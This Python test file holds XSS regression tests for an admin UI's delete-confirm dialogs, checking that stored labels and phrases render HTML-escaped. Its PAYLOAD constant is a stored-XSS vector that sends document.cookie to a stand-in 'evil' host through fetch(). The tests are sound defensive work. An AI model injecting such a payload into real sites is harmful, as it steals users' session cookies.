"""XSS regression tests for the delete-confirm slide-over dialogs (F2).

The record label rendered by the delete-confirm dialog comes straight from a
DB-stored ``name``/``title``/``email``/``username``/``label`` field — a stored
XSS payload must render escaped in every position it is interpolated
(header message, subtitle, bulk confirm phrase).
"""

from __future__ import annotations

from lexigram.admin.ui.organisms.admin_slide_over import (
    render_bulk_delete_confirm,
    render_delete_confirm,
)

PAYLOAD = '<img src=x onerror="fetch(\'https://evil/c?\'+document.cookie)">'
ESCAPED = "&lt;img src=x onerror=&quot;fetch(&#x27;https://evil/c?&#x27;+document.cookie)&quot;&gt;"


class TestDeleteConfirm:
    def test_record_label_escaped_in_default_message(self) -> None:
        html = render_delete_confirm(record_label=PAYLOAD, delete_url="/admin/x/1")
        assert PAYLOAD not in html
        assert "&lt;img" in html

    def test_record_label_escaped_in_subtitle(self) -> None:
        html = render_delete_confirm(record_label=PAYLOAD, delete_url="/admin/x/1")
        assert f'Deleting: "{PAYLOAD}"' not in html
        assert 'Deleting: "&lt;img src=x' in html

    def test_default_message_strong_markup_kept_structured(self) -> None:
        html = render_delete_confirm(record_label=PAYLOAD, delete_url="/admin/x/1")
        assert "<strong>" in html
        assert "<strong><img" not in html
        assert "&lt;/strong&gt;" not in html

    def test_custom_message_fragment_seam_unchanged(self) -> None:
        html = render_delete_confirm(
            record_label=PAYLOAD,
            delete_url="/admin/x/1",
            message="Are you sure? <strong>No undo</strong>.",
        )
        assert "Are you sure? <strong>No undo</strong>." in html

    def test_extra_warning_escaped(self) -> None:
        html = render_delete_confirm(
            record_label="safe",
            delete_url="/admin/x/1",
            extra_warning=PAYLOAD,
        )
        assert PAYLOAD not in html
        assert "&lt;img" in html


class TestBulkDeleteConfirm:
    def test_confirm_phrase_escaped_in_label_span(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            confirm_phrase=PAYLOAD,
        )
        assert PAYLOAD not in html
        assert "&lt;img" in html

    def test_confirm_phrase_escaped_in_placeholder_attribute(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            confirm_phrase=PAYLOAD,
        )
        assert f'placeholder="Type {PAYLOAD} here"' not in html
        assert (
            'placeholder="Type &lt;img src=x onerror=&quot;fetch(&#x27;https://evil/c?&#x27;'
            '+document.cookie)&quot;&gt; here"'
        ) in html

    def test_confirm_phrase_escaped_in_bind_disabled_attribute(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            confirm_phrase=PAYLOAD,
        )
        assert f"confirmText !== '{PAYLOAD}'" not in html

    def test_default_message_count_escaped(self) -> None:
        html = render_bulk_delete_confirm(record_count=3, bulk_url="/admin/x/bulk")
        assert "<strong>3</strong>" in html
        assert "&lt;strong&gt;" not in html

    def test_subtitle_escaped(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            subtitle=f'Deleting: "{PAYLOAD}"',
        )
        assert f'Deleting: "{PAYLOAD}"' not in html
        assert 'Deleting: "&lt;img' in html
